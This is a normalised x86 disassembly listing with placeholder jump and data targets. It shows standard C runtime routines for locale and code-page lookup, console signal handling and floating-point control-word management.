jne r-xdata
sub ecx edx
sar ecx 0x1
cmp ecx [ ebx + 0x5c ]
jne r-xdata
or [ edi ] 0x100
cmp [ edi + 0x4 ] ebx
xor eax eax
jmp r-xdata
push edi
push 0x1
push esi
call sub_43c1d3
add esp 0xc
test eax eax
je r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
or [ edi ] 0x100
xor eax eax
jmp r-xdata
cmp [ edi + 0x4 ] eax
jmp r-xdata
sub_43bfa3
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42fa1d
mov ebx eax
call sub_42fa1d
push esi
mov edi [ eax + 0x34c ]
call sub_43c07b
pop ecx
mov ecx [ ebx + 0x60 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
cmp [ ebx + 0x60 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
cmp [ ebx + 0x5c ] 0x0
je r-xdata
or [ edi ] 0x4
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
push edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_43c1d3
add esp 0xc
test eax eax
je r-xdata
push edi
push eax
sub_43c07b
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
xor esi esi
movzx ecx [ edx ]
test cx cx
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
push 0x5
pop edi
lea eax [ ecx - 0x41 ]
cmp ax di
ja r-xdata
add ecx 0xffd9
jmp r-xdata
movzx ecx cx
add ecx 0xffffffd0
shl esi 0x4
add esi ecx
movzx ecx [ edx ]
test cx cx
jne r-xdata
add ecx 0xfff9
lea eax [ ecx - 0x61 ]
lea edx [ edx + 0x2 ]
cmp ax di
ja r-xdata
pop edi
sub_43c0cc
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esi r--data
mov edx ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetACP@IAT ]
sbb edx edx
or edx 0x1
test di di
je r-xdata
mov esi r--data
mov edx ecx
mov edx eax
jmp r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
sbb eax eax
or eax 0x1
test di di
je r-xdata
test edx edx
je r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
push ecx
call sub_42f1a0
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
jmp r-xdata
sub_43c1af
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_43c1d3
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
call sub_42fa1d
mov esi [ ebp + 0x8 ]
mov edi eax
push 0x2
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
and ecx 0x3ff
push 0x20000001
or ecx 0x400
push ecx
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ edi + 0x50 ]
lea ecx [ esi + 0x2 ]
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
push [ edi + 0x50 ]
sub esi ecx
sar esi 0x1
call sub_43bd27
pop ecx
cmp eax esi
je r-xdata
sub_43c243
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
test esi esi
js r-xdata
xor al al
lea eax [ ebx + esi ]
cdq
sub eax edx
mov edi eax
mov eax [ ebp + 0x8 ]
sar edi 0x1
imul ecx edi 0xc
push [ ecx + eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
imul eax edi 0xc
add ecx 0x4
add eax ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
jns r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
lea ebx [ edi + 0x1 ]
lea esi [ edi - 0x1 ]
jmp r-xdata
cmp ebx esi
jle r-xdata
sub_43c2a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x18 ] eax
call sub_42fa1d
add eax 0x50
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
call sub_42fa1d
lea ecx [ ebp - 0x10 ]
xor edx edx
mov [ eax + 0x34c ] ecx
lea ecx [ esi + 0x80 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] esi
lea edi [ eax + 0x4 ]
mov [ edi ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] edx
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ ecx ] dx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ eax ] dx
je r-xdata
mov eax [ r--data ]
push edi
dec eax
push eax
push r--data
call sub_43c243
mov eax [ ebp - 0x14 ]
add esp 0xc
xor edx edx
mov [ ebp - 0x10 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
cmp [ eax ] dx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ esi + 0x100 ]
neg esi
sbb esi esi
and esi eax
push esi
call sub_43c0cc
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
xor eax eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43bbc2
pop ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43bcc6
cmp [ eax ] dx
je r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
xor edi edi
mov eax [ r--data ]
push [ ebp - 0x14 ]
dec eax
push eax
push r--data
call sub_43c243
add esp 0xc
test al al
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43bc2b
jmp r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor edi edi
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop ecx
jne r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43bcc6
cmp [ eax ] di
je r-xdata
push 0x1
push [ ebp - 0xc ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43bc2b
jmp r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
pop ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
push edi
push 0x55
add eax 0x250
push eax
push [ ebp - 0xc ]
call sub_430cf5
test ebx ebx
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
push edi
push 0x55
lea eax [ ebx + 0x120 ]
push eax
push [ ebp - 0xc ]
call sub_430cf5
push 0x40
push ebx
push 0x1001
push [ ebp - 0xc ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push 0x40
lea eax [ ebx + 0x80 ]
push eax
push 0x1002
push [ ebp - 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push 0xa
push 0x10
lea ecx [ ebx + 0x100 ]
push ecx
push esi
call sub_4455d0
add esp 0x10
sub_43c4a7
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_42fa1d
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ec4
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x88 ]
mov esp ebp
pop ebp
retn
sub_43c4dc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
test ebx ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0x10 ]
jae r-xdata
xor edi edi
push ebx
call sub_445981
pop ecx
mov edi eax
jmp r-xdata
call sub_42fef5
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
cmp edi esi
jae r-xdata
imul esi [ ebp + 0x10 ]
push esi
push ebx
call sub_4459b4
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebp
retn
sub esi edi
lea eax [ ebx + edi ]
push esi
push 0x0
push eax
call sub_40de60
add esp 0xc
sub_43c570
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0x8 ]
cmp edi [ ebp + 0xc ]
jne r-xdata
push esi
mov esi edi
push ebx
mov al 0x1
jmp r-xdata
add esi 0x8
cmp esi [ ebp + 0xc ]
jne r-xdata
mov ecx ebx
call [ r--data ]
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
cmp esi edi
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
add esi 0xfffffffc
pop ebx
pop esi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp [ esi - 0x4 ] 0x0
je r-xdata
push 0x0
mov ecx ebx
call [ r--data ]
call ebx
pop ecx
sub_43c5f3
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0xc ]
cmp [ ebp + 0x8 ] esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
add esi 0xfffffffc
push edi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
mov ecx edi
call [ r--data ]
call edi
pop ecx
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_43c658
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43c6a6
mov eax esi
call sub_40d2a6
retn 0xc
sub_43c6b2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_43c658
mov esp ebp
pop ebp
retn
sub_43c6f0
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_43c758
push 0x14
push r--data
call sub_4497c0
xor esi esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] esi
push 0x3
call sub_42f32c
pop ecx
mov [ ebp - 0x4 ] esi
mov edx [ rw-data ]
mov eax edx
mov esi edx
and eax 0x1f
mov ecx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ebx rw-data
xor esi [ rw-data ]
push 0x15
mov ebx rw-data
xor esi [ rw-data ]
push 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43c7e1
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
ror esi cl
mov [ ebp - 0x20 ] esi
pop edi
mov [ ebp - 0x24 ] edi
test esi esi
je r-xdata
cmp esi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax edx
mov [ ebx ] eax
xor eax eax
inc eax
push edi
mov ecx esi
call [ r--data ]
call esi
pop ecx
call sub_449809
retn 0x4
sub_43c806
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
sub eax 0x1
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x9
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x6
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x1
je r-xdata
xor eax eax
pop ebp
retn
sub_43c848
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_43c879
mov edi edi
push ebp
mov ebp esp
imul ecx [ r--data ] 0xc
mov eax [ ebp + 0xc ]
add ecx eax
cmp eax ecx
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
pop ebp
retn
add eax 0xc
cmp eax ecx
jne r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
sub_43c8a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
or eax 0xffffffff
pop ebp
retn
cmp eax 0x3
je r-xdata
cmp eax 0xd
je r-xdata
cmp eax 0xf
jle r-xdata
call sub_42fef5
mov [ eax ] 0x16
cmp eax 0x11
jle r-xdata
sub_43c8d5
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
push eax
push 0x3
call sub_43c6b2
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_43c8ec
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43c848
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43c848
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43c848
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43c848
pop ebp
retn
sub_43c939
push 0x2c
push r--data
call sub_4497c0
xor ebx ebx
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x34 ] ebx
mov cl 0x1
mov [ ebp - 0x1d ] cl
mov esi [ ebp + 0x8 ]
push 0x8
pop edi
cmp esi edi
jg r-xdata
cmp esi 0xb
je r-xdata
je r-xdata
call sub_42faa1
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
jne r-xdata
cmp esi 0xf
je r-xdata
lea eax [ esi - 0x1 ]
sub eax 0x1
je r-xdata
push [ ebx ]
push esi
call sub_43c879
pop ecx
pop ecx
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_43c806
add esp 0x4
jmp r-xdata
cmp esi 0x14
jle r-xdata
dec eax
sub eax 0x1
je r-xdata
add eax 0x8
xor cl cl
mov [ ebp - 0x1d ] cl
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
call sub_449809
retn
mov [ ebp - 0x28 ] eax
and [ ebp - 0x30 ] 0x0
test cl cl
je r-xdata
cmp esi 0x16
jg r-xdata
dec eax
sub eax 0x1
jne r-xdata
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1e ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x28 ]
test cl cl
je r-xdata
push 0x3
call sub_42f32c
pop ecx
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov edx [ eax ]
mov edx [ rw-data ]
mov ecx edx
and ecx 0x1f
xor edx [ eax ]
ror edx cl
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43caf9
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
test eax eax
jne r-xdata
mov eax edx
mov [ ebp - 0x24 ] eax
xor edx edx
cmp eax 0x1
sete dl
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x1e ] dl
test dl dl
jne r-xdata
xor eax eax
cmp esi edi
jne r-xdata
cmp esi edi
je r-xdata
test cl cl
je r-xdata
push esi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
call sub_42fa1d
push [ eax + 0x8 ]
push edi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
and [ ebx + 0x4 ] 0x0
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x3
call sub_417130
push 0x3
call sub_42f374
pop ecx
mov eax [ ebp - 0x30 ]
mov [ ebx + 0x4 ] eax
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi edi
je r-xdata
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov ecx [ ebp - 0x28 ]
mov [ ecx ] eax
call sub_43c927
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
call sub_43c927
mov [ eax ] 0x8c
cmp esi 0x4
jne r-xdata
call sub_42fa1d
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
cmp esi 0x4
jne r-xdata
imul eax [ r--data ] 0xc
add eax [ ebx ]
imul ecx [ r--data ] 0xc
add ecx eax
cmp esi edi
jne r-xdata
and [ eax + 0x8 ] 0x0
add eax 0xc
jmp r-xdata
mov [ ebp - 0x3c ] eax
cmp eax ecx
je r-xdata
sub_43cb41
push 0x18
push r--data
call sub_40d260
mov ebx [ ebp + 0xc ]
cmp ebx 0x4
je r-xdata
push [ ebp + 0x8 ]
cmp ebx 0x3
je r-xdata
mov edi [ ebp + 0x8 ]
cmp edi 0x2
je r-xdata
xor ebx ebx
mov [ ebp - 0x19 ] bl
mov esi ebx
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
push 0x3
call sub_42f32c
pop ecx
mov [ ebp - 0x4 ] ebx
cmp edi 0x2
je r-xdata
cmp edi 0x15
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp edi 0x15
jne r-xdata
cmp edi 0x16
je r-xdata
push edi
call sub_43c806
add esp 0x4
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
push 0x1
push sub_43c758
call [ SetConsoleCtrlHandler@IAT ]
test eax eax
je r-xdata
cmp edi 0x6
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43ccdb
test bl bl
jne r-xdata
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ eax ]
ror esi cl
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0xc ]
cmp eax 0x2
je r-xdata
call sub_42fee2
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov bl 0x1
mov [ ebp - 0x19 ] bl
mov esi [ ebp - 0x28 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp edi 0xf
je r-xdata
push edi
jmp r-xdata
mov eax esi
jmp r-xdata
push eax
call sub_43c6f0
pop ecx
mov ecx [ ebp - 0x28 ]
mov [ ecx ] eax
cmp edi 0x8
je r-xdata
call sub_43c8a1
pop ecx
call sub_40d2a6
retn
call sub_42faa1
mov esi eax
test esi esi
je r-xdata
cmp edi 0x4
je r-xdata
cmp [ esi ] r--data
jne r-xdata
cmp edi 0xb
je r-xdata
mov eax [ esi ]
mov [ ebp - 0x24 ] eax
push eax
push edi
call sub_43c879
pop ecx
pop ecx
test eax eax
je r-xdata
push [ r--data ]
call sub_42d0e4
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
lea edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x28 ] ecx
cmp ebx 0x2
je r-xdata
push [ r--data ]
push r--data
push eax
call sub_40d8e0
add esp 0xc
mov eax ecx
jmp r-xdata
imul esi [ r--data ] 0xc
add esi [ ebp - 0x24 ]
cmp eax esi
je r-xdata
cmp [ edx - 0x4 ] edi
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov [ edx ] ebx
add edx 0xc
lea ecx [ edx - 0x8 ]
cmp ecx esi
jne r-xdata
sub_43ccf3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl cl
jns r-xdata
push ebx
push esi
push edi
mov edi 0x200
test edi ecx
je r-xdata
push 0x10
pop eax
test ecx 0x400
je r-xdata
or eax 0x8
test ecx 0x800
je r-xdata
or eax 0x4
test ecx 0x1000
je r-xdata
or eax 0x2
mov esi 0x100
test esi ecx
je r-xdata
or eax 0x1
mov edx ecx
mov ebx 0x6000
and edx ebx
je r-xdata
or eax 0x80000
pop edi
and ecx 0x8040
pop esi
pop ebx
sub ecx 0x40
je r-xdata
cmp edx 0x2000
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax esi
cmp edx 0x4000
je r-xdata
or eax 0x3000000
pop ebp
retn
sub ecx 0x40
jne r-xdata
or eax edi
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x1000000
pop ebp
retn
or eax 0x300
jmp r-xdata
sub_43cd9e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43cde1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
stmxcsr [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
and eax 0xffffffc0
mov [ ebp - 0x8 ] eax
ldmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov esp ebp
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43ce39
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov edx 0x1000
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
fwait
fnstcw [ ebp - 0x8 ]
mov ax [ ebp - 0x8 ]
xor edx edx
test al 0x1
je r-xdata
pop edi
xor eax eax
pop esi
inc eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x1
jl r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
and [ esi ] 0x0
and ebx 0x308031f
stmxcsr [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
xor eax eax
test cl cl
jns r-xdata
test al 0x8
je r-xdata
or edx 0x8
test ecx 0x200
je r-xdata
push 0x10
pop eax
test al 0x10
je r-xdata
or edx 0x4
test ecx 0x400
je r-xdata
or eax 0x8
test al 0x20
je r-xdata
or edx 0x2
test ecx 0x800
je r-xdata
or eax 0x4
test al 0x2
je r-xdata
or edx 0x1
test edx ecx
je r-xdata
or eax 0x2
movzx esi ax
mov ecx esi
and ecx 0xc00
je r-xdata
or edx 0x80000
test ecx 0x100
je r-xdata
or eax 0x1
and esi 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
mov edx ecx
mov edi 0x6000
and edx edi
je r-xdata
or eax 0x80000
or edx 0x20000
cmp esi 0x200
jne r-xdata
or edx 0x100
cmp ecx 0x800
je r-xdata
push 0x40
and ecx 0x8040
pop edi
sub ecx edi
je r-xdata
cmp edx 0x2000
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx ebx
not ecx
and eax ebx
and ecx edx
or ecx eax
cmp ecx edx
je r-xdata
or edx 0x40000
mov ecx 0x1000
test cx ax
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp ecx 0xc00
jne r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax 0x100
cmp edx 0x4000
je r-xdata
mov edx 0x1000
push ecx
call sub_43d8ec
pop ecx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor ecx ecx
test al 0x1
je r-xdata
or edx 0x300
jmp r-xdata
mov [ esi ] eax
jmp r-xdata
push ecx
call sub_43d2ef
push eax
mov [ ebp - 0xc ] eax
call sub_445ab6
pop ecx
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor eax eax
test cl cl
jns r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx edi
jne r-xdata
or eax 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test ecx 0x200
je r-xdata
push 0x10
pop eax
mov ecx ebx
and ebx [ ebp + 0x8 ]
not ecx
and ecx eax
or ecx ebx
cmp ecx eax
je r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
test al 0x8
je r-xdata
or ecx 0x8
test ecx 0x400
je r-xdata
or eax 0x8
test al 0x10
je r-xdata
or ecx 0x4
test ecx 0x800
je r-xdata
or eax 0x4
test al 0x20
je r-xdata
or ecx 0x2
test ecx 0x1000
je r-xdata
or eax 0x2
test al 0x2
je r-xdata
or ecx 0x1
test ecx 0x100
je r-xdata
or eax 0x1
movzx esi ax
mov edx esi
and edx 0xc00
je r-xdata
or ecx 0x80000
mov edx ecx
mov ebx 0x6000
and edx ebx
je r-xdata
or eax 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
and ecx 0x8040
sub ecx edi
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x20000
cmp esi 0x200
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax 0x100
cmp edx 0x4000
je r-xdata
mov [ edi ] ecx
or ecx 0x40000
jmp r-xdata
mov edx 0x1000
test dx ax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx 0x200
jmp r-xdata
cmp edx 0xc00
jne r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx edi
jne r-xdata
or eax 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or ecx 0x300
jmp r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
sub_43d15d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
and edi 0x308031f
stmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
xor esi esi
mov eax esi
test cl cl
jns r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop eax
test ecx 0x400
je r-xdata
or eax 0x8
test ecx 0x800
je r-xdata
